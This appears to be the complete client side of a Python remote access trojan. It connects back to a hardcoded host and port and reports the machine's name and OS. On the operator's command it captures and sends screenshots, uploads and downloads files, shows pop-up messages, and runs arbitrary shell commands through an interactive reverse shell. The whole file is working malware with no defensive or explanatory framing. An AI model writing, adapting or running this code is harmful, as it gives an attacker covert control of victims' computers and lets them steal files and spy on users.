import socket, os, sys, platform, time
import pyscreeze
import subprocess
from tkinter import *
import threading

host = "192.168.15.107"
port = 4213
buffer_size = 1024

s = socket.socket()

def server_connect():
    while True:
        try:
            s.connect((host, port))
        except socket.error:
            time.sleep(5)
        else: break
    
    userInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release()
    send_data(str.encode(userInfo))

def decode_utf8(data):
    return data.decode("utf-8")
def receive_data(buffer):
    return s.recv(buffer)
def send_data(data):
    try:
        s.send(data)
    except:
        pass
def take_screenshot():
    picture_name = "beautiful.png"
    try:
        pyscreeze.screenshot(picture_name)

        file = open(picture_name, "rb")
        
        image_data = file.read(1024)

        while image_data:
            send_data(image_data)
            image_data = file.read(1024)

        time.sleep(1)
        send_data('done'.encode())
        file.close()
        os.remove(picture_name)
    except:
        pass

def send_file(file_directory):
    try:
        file_size = os.path.getsize(file_directory)
    except:
        send_data('NotFound'.encode())
        return
    send_data('pass'.encode())

    time.sleep(0.5)

    file = open(file_directory, "rb")
    bytes_read = file.read(4096)
    
    while bytes_read:
        send_data(bytes_read)
        bytes_read = file.read(4096)
    
    time.sleep(1)
    file.close()    
    send_data('done'.encode())

def receive_file(file_name):
    with open(file_name, "wb") as f:
        while True:
            bytes_read = s.recv(4096)
            if bytes_read == 'done'.encode():
                f.close()
                break
            f.write(bytes_read)

def receive_message():
    message = ''
    while True:
            bytes_read = receive_data(4096)
            try:
                if bytes_read == 'done'.encode():
                    break
                message += decode_utf8(bytes_read)
            except:
                pass
    if message != '':
        def messageBox():
            screen = Tk()
            screen.title('Letter for you!')
            screen.geometry('300x300')
            screen.configure(background='#8B0000')
            label = Label(screen, text=message, background='#8B0000', foreground='#fff')
            label.place(x=0, y=110, width=300, height=40)
            screen.mainloop()

        threading.Thread(target=messageBox).start()

def shell():
    global buffer_size
    SEPARATOR = '<sep>'
    initial_dir = os.getcwd()

    send_data(initial_dir.encode())

    while True:
        cmd = receive_data(buffer_size * 128).decode()
        splited_cmd = cmd.split()

        if cmd.lower() == 'exit':
            break
        
        if splited_cmd[0] == 'cd':
            try:
                os.chdir(''.join(splited_cmd[1:]))
            except FileNotFoundError as e:
                output = e
            else:
                output = ''
        else:
            output = subprocess.getoutput(cmd)
        
        cwd = os.getcwd()
        message = output + SEPARATOR + cwd
        send_data(message.encode())

    os.chdir(initial_dir)

server_connect()

while True:
    try:
        while True:
            data = receive_data(buffer_size)
            data = decode_utf8(data)
            if data == "exit":
                s.close()
                sys.exit(0)
            elif data == "screenshot":
                take_screenshot()
            elif 'upload-file' in data:
                file_directory = data.split(" ")[1]
                receive_file(file_directory)
            elif 'download-file' in data:
                file_directory = data.split(" ")[1]
                send_file(file_directory)
            elif 'message' in data:
                receive_message()
            elif 'shell' in data:
                shell()
            else:
                print(data)
    except socket.error:
        s.close()
        del s
        server_connect()
